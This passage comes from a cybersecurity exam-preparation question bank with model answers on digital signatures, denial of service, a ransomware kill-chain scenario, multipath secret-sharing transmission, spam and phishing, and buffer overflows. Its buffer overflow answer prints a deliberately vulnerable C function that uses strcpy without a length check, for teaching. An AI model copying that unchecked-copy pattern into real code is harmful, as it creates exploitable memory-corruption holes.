\text{Kuakata} \to \text{Decryption with } \text{Ku}^{-1}, and indicate the keys used in each stage.**

Answer:

   **(a) and (e) Is there a digital signature? — NO.**
   - The hash is computed and sent, but it is encrypted with **Kuakata's PUBLIC key (Ku)**, not with **Cox's Bazar's PRIVATE key (Kc⁻¹)**.
   - A digital signature requires the SENDER's private key. Since Ku is public, ANYONE could have produced this ciphertext while pretending to be Cox's Bazar.
   - The hash here provides integrity only — it detects accidental or malicious corruption, but proves nothing about who sent the message.

   How to add a proper digital signature
   - Cox's Bazar computes `h = H(Message)`.
   - Cox's Bazar encrypts that hash with its own **private key**: `Signature = E(h, Kc⁻¹)`.
   - The message plus this signature is then encrypted with **Ku** for confidentiality and transmitted.
   - Kuakata decrypts with `Ku⁻¹`, then decrypts the signature with Cox's Bazar's **public key Kc** to recover `h`, hashes the received message independently, and compares.
   - A match now proves origin, integrity AND non-repudiation.

   **(b) Identify the attack — Denial of Service (an INTERRUPTION attack).**
   - The attacker captures and BLOCKS the ciphertext so it never reaches Kuakata.
   - This is an **active attack** of the interruption type. It is not interception in the harmful sense, because the attacker cannot read the content.
   - It attacks **AVAILABILITY**, not confidentiality or integrity.
   - The attacker's position also constitutes a Man-in-the-Middle placement, but the action taken is denial of service.

   **(c) How to identify the origin of the message**
   - As described, the origin CANNOT be identified — there is no sender authentication of any kind.
   - To identify origin, add a **digital signature with Cox's Bazar's private key Kc⁻¹**, verified with the public key Kc obtained from a certificate issued by a trusted CA.
   - Supporting mechanisms: MAC with a shared secret key, mutual TLS authentication, and a **nonce or timestamp** to prevent replay.

   **(d) and (g) How to manage the attack**
   - **Acknowledgement and timeout** — Kuakata should acknowledge receipt. If Cox's Bazar receives no ACK within a timeout, it retransmits. This is exactly what TCP does.
   - **Sequence numbers** — a gap reveals that a message was dropped.
   - **Redundant / multiple paths** — send over more than one route, so blocking one path does not stop delivery.
   - **Heartbeat / keep-alive** monitoring so a blocked link is detected quickly.
   - **Network redundancy** — dual ISP links following physically separate routes.
   - **IPsec with anti-replay and integrity protection** to secure the channel itself.
   - **IDS/IPS and traffic monitoring** to detect the interception point.
   - **Out-of-band confirmation** for critical messages.
   - Note the limitation: a DoS attack cannot be PREVENTED by cryptography. Encryption protects content, never delivery. Only redundancy and detection address availability.

   **(f) Security services provided by the system as described**

   | Service | Provided? | Reason |
   |---|---|---|
   | **Confidentiality** | **Yes** | Encrypted with Ku; only Ku⁻¹ can decrypt, and the attacker does not have it |
   | **Integrity** | **Yes** | The hash allows Kuakata to detect any alteration — but only IF the message arrives |
   | **Authentication** | **No** | No sender private key is used, so origin is unproven |
   | **Non-repudiation** | **No** | Requires a digital signature, which is absent |
   | **Availability** | **No** | The attacker successfully blocked delivery |

   **(h) Complete communication diagram**

   ```mermaid
   flowchart TD
       M[Message M] --> H["Hash: h = H(M)"]
       M --> COMB[Combine: M + h + Routing Data]
       H --> COMB
       COMB --> ENC["Encrypt with Ku<br/>(Kuakata's PUBLIC key)"]
       ENC --> CT[Ciphertext]
       CT --> NET[Insecure Network]
       NET --> ATK["ATTACKER<br/>captures and BLOCKS<br/>cannot decrypt — no Ku⁻¹"]
       ATK -.->|message never arrives| K["Kuakata"]
       K --> DEC["Decrypt with Ku⁻¹<br/>(Kuakata's PRIVATE key)"]
       DEC --> VER["Recompute H(M) and compare with h"]
       VER --> OK[Integrity verified]
   ```

   Keys used at each stage

   | Stage | Key used | Purpose |
   |---|---|---|
   | Hashing | None | Integrity check value |
   | Encryption at Cox's Bazar | **Ku** — Kuakata's public key | Confidentiality |
   | Decryption at Kuakata | **Ku⁻¹** — Kuakata's private key | Recover the plaintext |
   | Signature (MISSING, should be added) | **Kc⁻¹** — Cox's Bazar's private key | Authentication and non-repudiation |
   | Signature verification (MISSING) | **Kc** — Cox's Bazar's public key | Confirm origin |

   - Summary of the design flaw: the scheme achieves confidentiality and integrity but omits authentication entirely, and it has no defence against interruption. Adding a signature with Kc⁻¹ fixes the first gap; acknowledgement plus path redundancy addresses the second.

2. **Explain Cyber Attack Scenario-** *[DPDC Junior Assistant Manager (JAM) 27.06.2025 compact it 1441 (ET: BUET)]*

Answer: The specific scenario was not printed with the question, so a representative attack scenario for a power distribution utility is described, following the standard **Cyber Kill Chain**.

   Scenario — ransomware attack on a distribution utility

   **Stage 1 — Reconnaissance**
   - The attacker gathers information from the company website, LinkedIn and public tender documents: employee names, email format, technologies in use, and vendor relationships.

   **Stage 2 — Weaponisation and Delivery**
   - A spear-phishing email is crafted, appearing to come from a known equipment vendor, with a malicious invoice attachment. It is sent to finance and procurement staff.

   **Stage 3 — Exploitation**
   - An employee opens the attachment. A macro executes and exploits an unpatched vulnerability, downloading the payload.

   **Stage 4 — Installation**
   - Malware establishes persistence through a scheduled task and a registry run key, and disables the antivirus.

   **Stage 5 — Command and Control**
   - The infected machine beacons out to the attacker's C2 server over HTTPS, blending with normal web traffic.

   **Stage 6 — Lateral movement and privilege escalation**
   - The attacker harvests credentials with Mimikatz, moves across the flat network using RDP and SMB, and eventually obtains domain administrator rights. Weeks may pass at this stage.

   **Stage 7 — Actions on objectives**
   - Sensitive data — customer records, billing data, SCADA configuration — is EXFILTRATED first.
   - Backups and shadow copies are deleted.
   - Ransomware is deployed across all servers simultaneously, encrypting billing, CRM and file systems.
   - A ransom note demands payment, with a threat to publish the stolen data.

   **Impact**
   - Billing and customer service halted, financial loss, regulatory reporting obligations, reputational damage, and — if the OT network were reached — risk to power distribution itself.

   **Where it could have been stopped**

   | Stage | Control that would have blocked it |
   |---|---|
   | Delivery | Email filtering, attachment sandboxing, user awareness training |
   | Exploitation | Patch management, macro blocking by policy |
   | Installation | EDR, application whitelisting, least privilege |
   | C2 | Egress filtering, DNS monitoring, threat intelligence feeds |
   | Lateral movement | Network segmentation, MFA, privileged access management |
   | Objectives | Offline immutable backups, DLP, IT/OT separation |

   - Key lesson: an attack has many stages, and defence in depth means any one layer can break the chain. The most valuable single control here is **network segmentation**, which prevents one compromised workstation from becoming a company-wide outage.

3. **Imagine yu should design a secure transmission protocol for sending data from one node to another node. You should divide the message in the multiple packets and this packets will be using different path so that any one cannot decrypt the message.** *[BDCCL Assistant Manager (Cyber Security) 14.10.2022 compact it 756 (ET: N/A)]*

Answer: The design combines **secret sharing / message splitting** with **multipath routing**, so that capturing traffic on any single path yields nothing useful.

   Design overview
   ```mermaid
   flowchart LR
       M[Original Message] --> E[Encrypt with AES session key]
       E --> S["Split into n shares<br/>(Shamir's Secret Sharing, k of n)"]
       S --> P1[Share 1 → Path A]
       S --> P2[Share 2 → Path B]
       S --> P3[Share 3 → Path C]
       P1 --> R[Receiver]
       P2 --> R
       P3 --> R
       R --> RC["Reconstruct from any k shares"]
       RC --> D[Decrypt with session key]
       D --> O[Original Message]
   ```

   Protocol steps

   **Step 1 — Key establishment**
   - Sender and receiver perform an authenticated key exchange (ECDHE with certificates) to agree a symmetric session key. Mutual authentication prevents a man-in-the-middle at this stage.

   **Step 2 — Encrypt**
   - Encrypt the whole message with **AES-256-GCM**, which provides confidentiality AND integrity in one operation.

   **Step 3 — Split using threshold secret sharing**
   - Apply **Shamir's Secret Sharing** to produce `n` shares such that any `k` of them reconstruct the message, but `k−1` shares reveal **absolutely nothing** — not even partial information.
   - This is the crucial property. Simply cutting the ciphertext into pieces would leak partial data; secret sharing does not.

   **Step 4 — Multipath routing**
   - Send each share over a DIFFERENT network path — different ISPs, different physical routes, or different overlay circuits.
   - An attacker must compromise at least `k` independent paths simultaneously to learn anything.

   **Step 5 — Per-share protection**
   - Each share carries a sequence number, a nonce and a timestamp (anti-replay), plus its own HMAC so tampering is detected per share.
   - Pad every share to the same length so traffic analysis cannot infer structure.

   **Step 6 — Reassembly**
   - The receiver collects any `k` valid shares, reconstructs the ciphertext, verifies the AES-GCM authentication tag, and decrypts.
   - Because only `k` of `n` are needed, the scheme also survives the loss or blocking of some paths — it provides availability as well as confidentiality.

   **Step 7 — Acknowledgement and retransmission**
   - The receiver acknowledges. Missing shares are retransmitted, ideally over a different path.

   Security properties achieved

   | Property | Mechanism |
   |---|---|
   | Confidentiality | AES-256-GCM plus secret sharing |
   | Integrity | GCM authentication tag and per-share HMAC |
   | Authentication | Mutual certificate-based key exchange |
   | Availability | k-of-n threshold tolerates lost or blocked paths |
   | Traffic analysis resistance | Uniform padding, multiple paths, optional dummy traffic |
   | Replay protection | Nonce and timestamp per share |

   - Practical basis: this is essentially how **onion routing (Tor)**, **multipath TCP** and **distributed storage systems** approach the same problem. The cost is added latency and complexity, so it suits high-value low-volume traffic rather than bulk data.

## Email & Messaging Security (Spam, Phishing) (3)

1. **Unsoliciated email is called?** *[BARI Assistant Maintenance Engineer 10.05.2024 compact it 1462 (ET: N/A)]*

Answer: Unsolicited email is called **SPAM** (also called junk email or Unsolicited Bulk Email, UBE).

   - Spam is unwanted email sent in bulk to a large number of recipients who never requested it, usually for advertising, scams or malware distribution.
   - The name comes from a Monty Python sketch in which the word "spam" is repeated endlessly, drowning out everything else.

   Types of spam
   - **Commercial spam** — unwanted advertising.
   - **Phishing email** — impersonating a trusted organisation to steal credentials. This is spam with criminal intent.
   - **Malware spam** — carrying an infected attachment or link.
   - **Scam email** — advance-fee fraud, lottery and inheritance scams.
   - **Spam in other channels** — SMS spam, comment spam, and social media spam.

   Anti-spam measures
   - **Spam filters** using content analysis, Bayesian filtering and machine learning.
   - **SPF, DKIM and DMARC** — DNS-based checks that verify the sender domain and block spoofing.
   - **Blacklists (RBL)** of known spam-sending IP addresses.
   - **Greylisting** — temporarily rejecting the first delivery attempt, which most spam senders never retry.
   - **CAPTCHA** on sign-up forms, and never publishing an email address in plain text on a web page.
   - Not clicking "unsubscribe" on genuine spam, since it confirms the address is live.

2. **If you downloaded the email, you will be able to face the problem. Which attack do you face?** *[BCC Assistant Programmer 11.11.2023 compact it 546 (ET: N/A)]*

Answer: Downloading or opening an email attachment from an unknown source most commonly leads to a **Malware attack**, delivered through a **Phishing email**.

   The specific attacks faced
   - **Malware infection** — the attachment carries a virus, trojan, spyware or **ransomware** that installs when opened.
   - **Phishing** — a link in the email leads to a fake login page that captures credentials.
   - **Ransomware** — the most damaging outcome; files are encrypted and a ransom demanded. The overwhelming majority of ransomware infections begin with an email attachment.
   - **Trojan / backdoor installation** — giving the attacker remote control.
   - **Keylogger** — recording passwords as they are typed.
   - **Macro attack** — a Word or Excel file whose macro downloads the real payload when macros are enabled.
   - **Drive-by download** — merely visiting the linked page installs malware through a browser vulnerability.

   Warning signs of a malicious email
   - Unexpected attachment, especially `.exe`, `.zip`, `.js`, `.scr` or a document asking to "Enable Content".
   - Urgent or threatening language, generic greeting, spelling errors.
   - Sender address slightly different from the genuine domain.
   - A link whose displayed text does not match its actual destination.

   Prevention
   - Do not open unexpected attachments, even from a known sender whose account may be compromised.
   - Verify through a separate channel before acting.
   - Keep antivirus and the operating system updated.
   - Disable macros by default.
   - Use email filtering with attachment sandboxing.
   - Maintain backups, so a ransomware infection is recoverable.

3. **e) What is email? What precautions can be taken to prevent unnecessary and unwanted e-mails?** *[Ministry of Finance Programmer 2013 compact it 1272 (ET: N/A)]*

Answer:

   (a) Email
   - **Electronic mail** is a method of exchanging digital messages over a computer network. A message is composed by the sender, transmitted through mail servers, and stored in the recipient's mailbox until read.
   - Protocols: **SMTP** (port 25/587) sends mail; **POP3** (port 110) downloads it to one device; **IMAP** (port 143) keeps it on the server and synchronises across devices.
   - Components: sender and recipient addresses, subject, body, attachments, and headers carrying routing information.

   (b) Precautions against unwanted email (spam)

   **Technical measures**
   - **Enable the spam filter** in the mail client or server; modern filters use Bayesian and machine-learning classification.
   - **Configure SPF, DKIM and DMARC** on your own domain, which prevents others spoofing it and improves your delivery reputation.
   - **Use blacklists (RBL)** to reject mail from known spam sources.
   - **Greylisting** — temporarily reject first delivery attempts; genuine servers retry, most spam senders do not.
   - **Attachment scanning and sandboxing** at the mail gateway.
   - Block dangerous attachment types (`.exe`, `.scr`, `.js`) at the gateway.

   **Behavioural measures**
   - **Never publish your email address in plain text** on a website; use an image or an obfuscated form, since spammers harvest addresses with crawlers.
   - **Do not reply to spam or click its unsubscribe link** — it confirms the address is live and increases the volume.
   - **Use a secondary address** for online registrations and newsletters, keeping the primary address private.
   - **Read privacy policies** before giving an address to a website.
   - **Do not forward chain emails**, which circulate address lists.
   - Use **disposable or alias addresses** for one-off sign-ups.

   **Organisational measures**
   - Staff awareness training on recognising phishing.
   - A clear reporting mechanism for suspicious email.
   - Regular review of filter effectiveness and false positives.

## Buffer Overflow & Software Vulnerabilities (1)

1. **Explain buffer overflow attack with an example.** *[BTCL Assistant Manager (Technical) 2023 compact it 592 (ET: BUET)]*

Answer: A buffer overflow occurs when a program writes more data into a fixed-size memory buffer than it can hold, so the excess spills into ADJACENT memory. An attacker exploits this to overwrite critical values and take control of execution.

   Why it happens
   - Languages such as C and C++ do not perform automatic bounds checking. Functions like `gets()`, `strcpy()` and `scanf("%s")` copy until they find a terminator, regardless of the destination size.

   Vulnerable example
   ```c
   #include <stdio.h>
   #include <string.h>

   void vulnerable(char *input) {
       char buffer[10];        // only 10 bytes reserved
       strcpy(buffer, input);  // NO length check — the flaw
       printf("Input: %s\n", buffer);
   }

   int main(int argc, char *argv[]) {
       vulnerable(argv[1]);
       return 0;
   }
   ```
   - Passing a 10-character string is fine. Passing 100 characters writes 90 bytes past the end of `buffer`.

   What lies beyond the buffer — the stack layout
   ```
   Higher addresses
   +---------------------------+
   |  Return address           |  <-- overwriting THIS hijacks execution
   +---------------------------+
   |  Saved base pointer (EBP) |
   +---------------------------+
   |  buffer[10]               |  <-- overflow starts here and grows upward
   +---------------------------+
   Lower addresses
   ```

   How the attack works
   - **Step 1** — the attacker supplies input longer than the buffer.
   - **Step 2** — the excess overwrites the saved base pointer and then the **return address**.
   - **Step 3** — the attacker sets the return address to point at their own injected code (shellcode) placed elsewhere in the input.
   - **Step 4** — when the function returns, the CPU jumps to that address and executes the attacker's code, typically spawning a shell with the program's privileges.

   Consequences
   - Arbitrary code execution, privilege escalation (critical if the program runs as root), program crash (denial of service), and data corruption.
   - Historic examples: the Morris Worm (1988), Code Red, and SQL Slammer all used buffer overflows.

   Prevention

   **Coding practices**
   - Use bounded functions: `strncpy()` instead of `strcpy()`, `fgets()` instead of `gets()`, `snprintf()` instead of `sprintf()`.
   - Always validate input length before copying.
   - Prefer memory-safe languages — Java, Python, Rust, C# perform bounds checking automatically.

   **Compiler and OS protections**
   - **Stack canaries** — a random value placed before the return address; if it is altered, the program aborts before returning.
   - **ASLR (Address Space Layout Randomisation)** — randomises memory addresses so the attacker cannot predict where to jump.
   - **DEP / NX bit** — marks the stack non-executable, so injected shellcode cannot run.
   - **Fortify Source** and compiler warnings (`-Wall -Wextra -fstack-protector`).

   **Process**
   - Static analysis tools, fuzzing, and code review focused on all memory-copy operations.
